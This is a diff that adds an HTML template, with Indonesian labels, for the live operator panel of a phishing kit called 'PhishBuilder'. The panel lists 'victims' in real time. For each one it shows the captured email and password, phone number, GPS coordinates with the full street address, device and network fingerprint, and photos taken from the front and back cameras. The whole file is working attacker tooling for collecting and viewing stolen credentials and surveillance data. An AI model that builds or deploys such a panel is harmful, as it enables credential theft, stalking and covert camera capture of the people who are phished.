@@ -1,0 +1,186 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Live Panel — {{ page.title }}</title>
+<style>
+  :root {
+    --bg: #0f1117; --card: #1a1d27; --border: #2a2e3b;
+    --text: #e4e6ed; --muted: #8b90a0; --accent: #6366f1; --accent2: #22c55e; --danger: #ef4444;
+  }
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  body { background: var(--bg); color: var(--text); font-family: 'Inter', system-ui, sans-serif; min-height: 100vh; }
+  nav { display: flex; align-items: center; justify-content: space-between; padding: 16px 32px; border-bottom: 1px solid var(--border); background: var(--card); }
+  .logo { font-weight: 700; font-size: 18px; }
+  .logo span { color: var(--accent); }
+  .nav-links a { color: var(--muted); text-decoration: none; margin-left: 24px; font-size: 14px; }
+  .container { max-width: 1200px; margin: 0 auto; padding: 32px 24px; }
+  .header { display: flex; justify-content: space-between; align-items: flex-start; margin-bottom: 28px; flex-wrap: wrap; gap: 16px; }
+  h1 { font-size: 24px; }
+  .badge { background: rgba(34,197,94,.15); color: var(--accent2); padding: 4px 12px; border-radius: 20px; font-size: 13px; font-weight: 600; }
+  .stats { display: flex; gap: 16px; margin-bottom: 28px; flex-wrap: wrap; }
+  .stat-card { background: var(--card); border: 1px solid var(--border); border-radius: 10px; padding: 18px 24px; min-width: 140px; }
+  .stat-card .num { font-size: 28px; font-weight: 700; color: var(--accent2); }
+  .stat-card .label { font-size: 13px; color: var(--muted); margin-top: 2px; }
+  .victim { background: var(--card); border: 1px solid var(--border); border-radius: 12px; padding: 20px; margin-bottom: 16px; }
+  .victim-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 14px; flex-wrap: wrap; gap: 8px; }
+  .victim-id { font-weight: 600; font-size: 15px; }
+  .time { font-size: 12px; color: var(--muted); }
+  .grid2 { display: grid; grid-template-columns: 1fr 1fr; gap: 16px; }
+  @media (max-width: 700px) { .grid2 { grid-template-columns: 1fr; } }
+  .section { margin-bottom: 12px; }
+  .section h4 { font-size: 12px; text-transform: uppercase; letter-spacing: .5px; color: var(--muted); margin-bottom: 6px; }
+  .section p, .section code { font-size: 13px; word-break: break-all; }
+  .creds { background: rgba(239,68,68,.08); border: 1px solid rgba(239,68,68,.25); border-radius: 8px; padding: 12px 14px; }
+  .creds strong { color: var(--danger); }
+  .cams { display: flex; gap: 12px; flex-wrap: wrap; }
+  .cams img { max-width: 220px; border-radius: 8px; border: 1px solid var(--border); }
+  .addr { background: rgba(99,102,241,.08); border: 1px solid rgba(99,102,241,.25); border-radius: 8px; padding: 12px 14px; font-size: 13px; line-height: 1.6; }
+  .live-dot { width: 8px; height: 8px; background: var(--accent2); border-radius: 50%; display: inline-block; margin-right: 6px; animation: pulse 1.5s infinite; }
+  @keyframes pulse { 0%,100%{opacity:1} 50%{opacity:.4} }
+  .empty { text-align: center; padding: 60px; color: var(--muted); }
+</style>
+</head>
+<body>
+<nav>
+  <div class="logo">Phish<span>Builder</span></div>
+  <div class="nav-links">
+    <a href="/">Home</a>
+    <a href="/create">Create</a>
+    <a href="/logout" style="color:#ef4444">Logout</a>
+  </div>
+</nav>
+<div class="container">
+  <div class="header">
+    <div>
+      <h1>{{ page.title }}</h1>
+      <div style="margin-top:6px;font-size:13px;color:var(--muted)">
+        Template: {{ page.template }} · <a href="/p/{{ page_id }}" target="_blank" style="color:var(--accent)">Buka phishing page</a>
+      </div>
+    </div>
+    <div class="badge"><span class="live-dot"></span> LIVE</div>
+  </div>
+
+  <div class="stats">
+    <div class="stat-card">
+      <div class="num" id="count">0</div>
+      <div class="label">Total Korban</div>
+    </div>
+    <div class="stat-card">
+      <div class="num" id="last-time">—</div>
+      <div class="label">Korban Terakhir</div>
+    </div>
+  </div>
+
+  <div id="list">
+    <div class="empty">Menunggu korban pertama...</div>
+  </div>
+</div>
+
+<script>
+const PAGE_ID = "{{ page_id }}";
+const list = document.getElementById("list");
+const countEl = document.getElementById("count");
+const lastEl = document.getElementById("last-time");
+
+function render(victims) {
+  countEl.textContent = victims.length;
+  if (victims.length === 0) {
+    list.innerHTML = '<div class="empty">Menunggu korban pertama...</div>';
+    return;
+  }
+  lastEl.textContent = victims[0].time.slice(11, 19) + " UTC";
+
+  list.innerHTML = victims.map(v => {
+    const addr = v.address || {};
+    const loc = v.location || {};
+    const dev = v.device || {};
+    const bat = v.battery || {};
+    const net = v.network || {};
+    const scr = v.screen || {};
+
+    const addressLines = [
+      addr.village || addr.suburb || addr.neighbourhood || "",
+      addr.city_district || addr.district || addr.county || "",
+      addr.city || addr.town || addr.municipality || "",
+      addr.state || addr.region || "",
+      addr.postcode || "",
+      addr.country || ""
+    ].filter(Boolean).join(", ");
+
+    return `
+    <div class="victim">
+      <div class="victim-header">
+        <div class="victim-id">#${v.id} · ${v.ip}</div>
+        <div class="time">${v.time.replace("T"," ").replace("Z"," UTC")}</div>
+      </div>
+
+      <div class="creds section">
+        <h4>Credentials</h4>
+        <p><strong>Email / User:</strong> ${esc(v.email)}</p>
+        <p><strong>Password:</strong> ${esc(v.password)}</p>
+        ${v.phone ? `<p><strong>Phone:</strong> ${esc(v.phone)}</p>` : ""}
+      </div>
+
+      <div class="grid2" style="margin-top:14px">
+        <div class="section">
+          <h4>Lokasi Lengkap</h4>
+          <div class="addr">
+            ${loc.lat ? `Lat: ${loc.lat.toFixed(6)}, Lon: ${loc.lon.toFixed(6)} (±${Math.round(loc.accuracy||0)}m)<br>` : "Lokasi tidak tersedia<br>"}
+            ${addressLines || (loc.display || "—")}
+            ${addr.village ? `<br><strong>Desa/Kelurahan:</strong> ${addr.village || addr.suburb || addr.neighbourhood}` : ""}
+            ${addr.city_district || addr.district ? `<br><strong>Kecamatan:</strong> ${addr.city_district || addr.district}` : ""}
+            ${addr.city || addr.town ? `<br><strong>Kota/Kab:</strong> ${addr.city || addr.town}` : ""}
+            ${addr.state ? `<br><strong>Provinsi:</strong> ${addr.state}` : ""}
+          </div>
+        </div>
+
+        <div class="section">
+          <h4>Device Info</h4>
+          <p>Platform: ${esc(dev.platform || "—")}</p>
+          <p>UA: ${esc((dev.userAgent || v.user_agent || "").slice(0,80))}...</p>
+          <p>Screen: ${scr.width||"?"}×${scr.height||"?"} @${scr.pixelRatio||1}x</p>
+          <p>Battery: ${bat.level != null ? Math.round(bat.level*100)+"%" : "—"} ${bat.charging ? "(charging)" : ""}</p>
+          <p>Network: ${net.effectiveType || "—"} · ${net.downlink || "?"}Mbps</p>
+          <p>Timezone: ${esc(dev.timezone || "—")}</p>
+          <p>Language: ${esc(dev.language || "—")}</p>
+          <p>CPU cores: ${dev.hardwareConcurrency || "—"} · RAM: ${dev.deviceMemory || "?"}GB</p>
+        </div>
+      </div>
+
+      ${(v.camera_front || v.camera_back) ? `
+      <div class="section" style="margin-top:14px">
+        <h4>Kamera</h4>
+        <div class="cams">
+          ${v.camera_front ? `<div><div style="font-size:11px;color:var(--muted);margin-bottom:4px">Depan</div><img src="${v.camera_front}"></div>` : ""}
+          ${v.camera_back ? `<div><div style="font-size:11px;color:var(--muted);margin-bottom:4px">Belakang</div><img src="${v.camera_back}"></div>` : ""}
+        </div>
+      </div>` : ""}
+    </div>`;
+  }).join("");
+}
+
+function esc(s) {
+  if (!s) return "—";
+  return String(s).replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;");
+}
+
+// Realtime via SSE
+const es = new EventSource("/api/stream/" + PAGE_ID);
+es.onmessage = (e) => {
+  try {
+    const data = JSON.parse(e.data);
+    render(data);
+  } catch(err) {}
+};
+es.onerror = () => {
+  // fallback polling
+  setTimeout(() => location.reload(), 5000);
+};
+
+// Initial load
+fetch("/api/victims/" + PAGE_ID).then(r => r.json()).then(render);
+</script>
+</body>
+</html>
